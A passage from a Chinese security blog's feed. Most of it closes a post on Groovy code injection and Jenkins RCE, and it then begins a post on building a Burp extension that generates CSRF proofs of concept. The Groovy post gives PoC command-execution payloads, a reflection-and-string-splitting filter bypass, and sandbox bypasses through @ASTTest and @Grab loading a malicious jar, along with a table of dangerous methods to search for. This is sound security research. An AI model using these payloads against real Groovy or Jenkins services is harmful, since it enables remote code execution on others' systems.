class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println(<span class="string">"mi1k7ea"</span>)</span><br></pre></td></tr></table></figure><p>在Windows运行<code>groovy.bat 1.groovy</code>即可执行该Groovy脚本：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/3.png" alt=""></p><h4 id="通过IDE运行Groovy脚本"><a href="#通过IDE运行Groovy脚本" class="headerlink" title="通过IDE运行Groovy脚本"></a>通过IDE运行Groovy脚本</h4><p>有一个叫GroovyShell的类含有main(String[])方法可以运行任何Groovy脚本。</p><p>在前面的IDEA中可以直接运行Groovy脚本：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/4.png" alt=""></p><p>当然，也可以在Java环境中通过groovy-all.jar中的groovy.lang.GroovyShell类来运行Groovy脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp groovy-all-2.4.12.jar groovy.lang.GroovyShell 1.groovy</span><br></pre></td></tr></table></figure><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/5.png" alt=""></p><h4 id="用Groovy创建Unix脚本"><a href="#用Groovy创建Unix脚本" class="headerlink" title="用Groovy创建Unix脚本"></a>用Groovy创建Unix脚本</h4><p>你可以用Groovy编写Unix脚本并且像Unix脚本一样直接从命令行运行它.倘若你安装的是二进制分发包并且设置好环境变量,那么下面的代码将会很好的工作。</p><p>编写一个类似如下的脚本文件，保存为：HelloGroovy</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env groovy</span></span><br><span class="line">println(<span class="string">"this is groovy script"</span>)</span><br><span class="line">println(<span class="string">"Hi,"</span>+args[<span class="number">0</span>]+<span class="string">" welcome to Groovy"</span>)</span><br></pre></td></tr></table></figure><p>然后在命令行下执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x HelloGroovy</span><br><span class="line">$ ./HelloGroovy micmiu.com</span><br><span class="line">this is groovy script</span><br><span class="line">Hi,micmiu.com welcome to Groovy</span><br></pre></td></tr></table></figure><h2 id="0x03-Groovy代码注入"><a href="#0x03-Groovy代码注入" class="headerlink" title="0x03 Groovy代码注入"></a>0x03 Groovy代码注入</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>我们知道，Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。</p><p>在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE。</p><p>如下代码简单地执行命令：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        <span class="keyword">def</span> cmd = <span class="string">"calc"</span>;</span><br><span class="line">        println <span class="string">"$&#123;cmd.execute()&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段Groovy代码被执行就会弹计算器：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/6.png" alt=""></p><h3 id="几种PoC变通形式"><a href="#几种PoC变通形式" class="headerlink" title="几种PoC变通形式"></a>几种PoC变通形式</h3><p>Groovy代码注入实现命令执行有以下几种变通的形式：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>在下面一些场景中，会触发Groovy代码注入漏洞。</p><h4 id="GroovyShell"><a href="#GroovyShell" class="headerlink" title="GroovyShell"></a>GroovyShell</h4><p>GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。</p><p>GroovyShellExample.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        groovyShell.evaluate(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接运行即可弹计算器：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/7.png" alt=""></p><p>或者换成运行Groovy脚本的方式也是也一样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.Script;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        Script script = groovyShell.parse(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        script.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br></pre></td></tr></table></figure><p>此外，可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。</p><h4 id="GroovyScriptEngine"><a href="#GroovyScriptEngine" class="headerlink" title="GroovyScriptEngine"></a>GroovyScriptEngine</h4><p>GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。</p><p>GroovyScriptEngineExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.Binding;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyScriptEngine groovyScriptEngine = <span class="keyword">new</span> GroovyScriptEngine(<span class="string">""</span>);</span><br><span class="line">        groovyScriptEngine.run(<span class="string">"src/test.groovy"</span>,<span class="keyword">new</span> Binding());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h4 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h4><p>GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。</p><p>GroovyClassLoaderExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyClassLoader;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyClassLoaderExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyClassLoader groovyClassLoader = <span class="keyword">new</span> GroovyClassLoader();</span><br><span class="line">        Class loadClass = groovyClassLoader.parseClass(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        GroovyObject groovyObject = (GroovyObject) loadClass.newInstance();</span><br><span class="line">        groovyObject.invokeMethod(<span class="string">"main"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h4 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h4><p>ScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。</p><ul><li>数据交换：表现在调度引擎的时候，允许将数据输入/输出引擎，至于引擎内的数据持有的具体方式有两种：普通的键值对和Bindings（interface Bindings extends Map&lt;String,Object&gt;）；</li><li>脚本执行：脚本引擎执行表现为调用eval()；</li></ul><p>ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。</p><p>在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的。</p><p>ScriptEngineExample.java，直接运行即命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        groovyEngine.eval(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行Groovy脚本，需要实现读取文件内容的接口而不能直接传入File类对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        String code = readfile(<span class="string">"src/test.groovy"</span>);</span><br><span class="line">        groovyEngine.eval(code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readfile</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(filename));</span><br><span class="line">        String string = <span class="string">""</span>;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">while</span> ((str = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            string = string + str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h2 id="0x04-Bypass-Tricks"><a href="#0x04-Bypass-Tricks" class="headerlink" title="0x04 Bypass Tricks"></a>0x04 Bypass Tricks</h2><h3 id="利用反射机制和字符串拼接Bypass"><a href="#利用反射机制和字符串拼接Bypass" class="headerlink" title="利用反射机制和字符串拼接Bypass"></a>利用反射机制和字符串拼接Bypass</h3><p>直接的命令执行在前面已经说过几种形式了：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line">Class&lt;?&gt; rt = Class.forName("java.la" + "ng.Run" + "time");</span><br><span class="line">Method gr = rt.getMethod("getR" + "untime");</span><br><span class="line">Method ex = rt.getMethod("ex" + "ec", String.class);</span><br><span class="line">ex.invoke(gr.invoke(null), "ca" + "lc")</span><br></pre></td></tr></table></figure><h3 id="Groovy沙箱Bypass"><a href="#Groovy沙箱Bypass" class="headerlink" title="Groovy沙箱Bypass"></a>Groovy沙箱Bypass</h3><p>前面说到的Groovy代码注入都是注入了execute()函数，从而能够成功执行Groovy代码，这是因为不是在Jenkins中执行即没有Groovy沙箱的限制。但是在存在Groovy沙箱即只进行AST解析无调用或限制execute()函数的情况下就需要用到其他技巧了。这也是Orange大佬在绕过Groovy沙箱时用到的技巧。</p><h4 id="AST注解执行断言"><a href="#AST注解执行断言" class="headerlink" title="@AST注解执行断言"></a>@AST注解执行断言</h4><p>参考Groovy的<a href="http://groovy-lang.org/metaprogramming.html" target="_blank" rel="noopener">Meta Programming手册</a>，利用AST注解能够执行断言从而实现代码执行（本地测试无需assert也能触发代码执行）。</p><p>PoC：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">'''</span></span><br><span class="line"><span class="string">    @groovy.transform.ASTTest(value=&#123;</span></span><br><span class="line"><span class="string">        assert Runtime.getRuntime().exec("calc")</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    def x</span></span><br><span class="line"><span class="string">'''</span>);</span><br></pre></td></tr></table></figure><p>本地测试：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/12.png" alt=""></p><h4 id="Grab注解加载远程恶意类"><a href="#Grab注解加载远程恶意类" class="headerlink" title="@Grab注解加载远程恶意类"></a>@Grab注解加载远程恶意类</h4><p>@Grab注解的详细用法在<a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">Dependency management with Grape</a>中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。</p><p>编写恶意Exp类，命令执行代码写在其构造函数中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.java</span><br><span class="line">mkdir -p META-INF/services/</span><br><span class="line"><span class="built_in">echo</span> Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runners</span><br><span class="line">jar cvf poc-0.jar Exp.class META-INF</span><br></pre></td></tr></table></figure><p>先在Web根目录中新建<code>/test/poc/0/</code>目录，然后复制该jar包到该子目录下，接着开始HTTP服务。</p><p>PoC：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">'''</span></span><br><span class="line"><span class="string">    @GrabConfig(disableChecksums=true)</span></span><br><span class="line"><span class="string">    @GrabResolver(name='Exp', root='http://127.0.0.1:8000/')</span></span><br><span class="line"><span class="string">    @Grab(group='test', module='poc', version='0')</span></span><br><span class="line"><span class="string">    import Exp;</span></span><br><span class="line"><span class="string">'''</span>)</span><br></pre></td></tr></table></figure><p>运行，成功请求远程恶意Jar包并导入恶意Exp类执行其构造函数，从而导致RCE：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/13.png" alt=""></p><h2 id="0x05-排查方法"><a href="#0x05-排查方法" class="headerlink" title="0x05 排查方法"></a>0x05 排查方法</h2><p>排查关键类函数特征：</p><table><thead><tr><th>关键类</th><th>关键函数</th></tr></thead><tbody><tr><td>groovy.lang.GroovyShell</td><td>evaluate</td></tr><tr><td>groovy.util.GroovyScriptEngine</td><td>run</td></tr><tr><td>groovy.lang.GroovyClassLoader</td><td>parseClass</td></tr><tr><td>javax.script.ScriptEngine</td><td>eval</td></tr></tbody></table><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html" target="_blank" rel="noopener">Hacking Jenkins Part 1 - Play with Dynamic Routing</a></p><p><a href="http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html" target="_blank" rel="noopener">Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</a></p><p><a href="https://www.anquanke.com/post/id/172796" target="_blank" rel="noopener">Jenkins RCE分析（CVE-2018-1000861分析）</a></p><p><a href="https://xz.aliyun.com/t/6372" target="_blank" rel="noopener">Jenkins groovy scripts for read teamers and penetration testers</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Jenkins" scheme="https://www.mi1k7ea.com/tags/Jenkins/"/>
    
      <category term="Groovy" scheme="https://www.mi1k7ea.com/tags/Groovy/"/>
    
  </entry>
  
  <entry>
    <title>BurpExtender开发之CSRF PoC生成器</title>
    <link href="https://www.mi1k7ea.com/2020/09/04/BurpExtender%E5%BC%80%E5%8F%91%E4%B9%8BCSRF-PoC%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <id>https://www.mi1k7ea.com/2020/09/04/BurpExtender开发之CSRF-PoC生成器/</id>
    <published>2020-09-04T06:24:26.000Z</published>
    <updated>2020-09-04T09:38:59.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近没搞白嫖版而是用的社区版的Burp，很多功能用不上，而且之前的Burp插件都是基于Python来写的，现在就换Java来写下插件吧，就拿CSRF PoC生成器来练练手。</p><p>项目地址：<a href="https://github.com/mi1k7ea/BurpExtender-CSRFPoCGenerator" target="_blank" rel="noopener">BurpExtender-CSRFPoCGenerator</a></p><h2 id="0x01-Burp插件开发基础"><a href="#0x01-Burp插件开发基础" class="headerlink" title="0x01 Burp插件开发基础"></a>0x01 Burp插件开发基础</h2><p>主要参考Her0in大佬系列文章：</p><p><a href="http://www.vuln.cn/6098" target="_blank" rel="noopener">BurpSuite插件开发指南之 API 上篇 – Her0in</a></p><p><a href="http://www.vuln.cn/6099" target="_blank" rel="noopener">BurpSuite插件开发指南之 API 下篇 – Her0in</a></p><p><a href="http://www.vuln.cn/6100" target="_blank" rel="noopener">BurpSuite插件开发指南之 Java 篇 – Her0in</a></p><p><a href="http://www.vuln.cn/6101" target="_blank" rel="noopener">BurpSuite插件开发指南之 Python 篇 – Her0in</a></p><p>当然，官方也给出了一些插件实例供参考学习：<a href="https://portswigger.net/burp/extender/" target="_blank" rel="noopener">https://portswigger.net/burp/extender/</a></p><p>将Burp提供的扩展接口和使用方式大致了解之后就能入手了。</p><h2 id="0x02-插件开发——CSRF-PoC生成器"><a href="#0x02-插件开发——CSRF-PoC生成器" class="headerlink" title="0x02 插件开发——CSRF PoC生成器"></a>0x02 插件开发——CSRF PoC生成器</h2><p>Burp的Extender标签下，有个APIs子标签，其中展示了有哪些扩展接口及其功能。这里点击Save Interface files下载下来：</p><p><img src="/2020/09/04/BurpExtender开发之CSRF-PoC生成器/1.png" alt=""></p><p>下载下来是个burp文件夹，其中都是Burp插件相关接口的java文件。</p><p>使用IDEA打开，将burp包放入src目录中，在burp包下新建名为“BurpExtender”的类：</p><p><img src="/2020/09/04/BurpExtender开发之CSRF-PoC生成器/2.png" alt=""></p><p>直接看代码吧。</p><p>这里BurpExtender类实现了IBurpExtender接口和IContextMenuFactory接口，其中定义了三个BurpExtender类成员变量，并在registerExtenderCallbacks()函数中完成初始化，然后设置插件名和注册上下文菜单工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span> <span class="keyword">implements</span> <span class="title">IBurpExtender</span>, <span class="title">IContextMenuFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> IBurpExtenderCallbacks callbacks;</span><br><span class="line">    <span class="keyword">public</span> IExtensionHelpers helpers;</span><br><span class="line">    <span class="keyword">public</span> PrintWriter stdout;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.callbacks = callbacks;</span><br><span class="line">        <span class="keyword">this</span>.helpers = callbacks.getHelpers();</span><br><span class="line">        <span class="keyword">this</span>.stdout = <span class="keyword">new</span> PrintWriter(callbacks.getStdout(), <span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置插件名</span></span><br><span class="line">        callbacks.setExtensionName(<span class="string">"Mi1k7ea"</span>);</span><br><span class="line">        callbacks.registerContextMenuFactory(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Burp所有插件必须实现IBurpExtender接口且命名必须为“BurpExtender”，且必须实现其registerExtenderCallbacks()函数。当插件被加载时，Burp会调用registerExtenderCallbacks()函数并传递一个IBurpExtenderCallbacks类对象，插件可以通过这个对象来调用很多扩展Burp功能必需的方法，比如这里的getHelpers()、getStdout()、setExtensionName()、registerContextMenuFactory()等方法。</p><ul><li>getHelpers()函数：用于获取IExtensionHelpers接口类对象，在后续用到了该类的analyzeRequest()函数来解析请求报文；</li><li>getStdout()函数：用于获取标准输出流，在Extender-&gt;Extensions-&gt;Output窗口中输出内容；</li><li>setExtensionName()函数：用于设置插件名；</li><li>registerContextMenuFactory()函数：用于注册自定义上下文菜单项的工厂。当用户在Burp中的任何地方调用一个上下文菜单时就会触发这个工厂函数，根据菜单调用的细节，提供应该被显示在上下文菜单中的任何自定义上下文菜单项；</li></ul><p>接着，是实现IContextMenuFactory接口类的createMenuItems()函数，先看外围部分代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 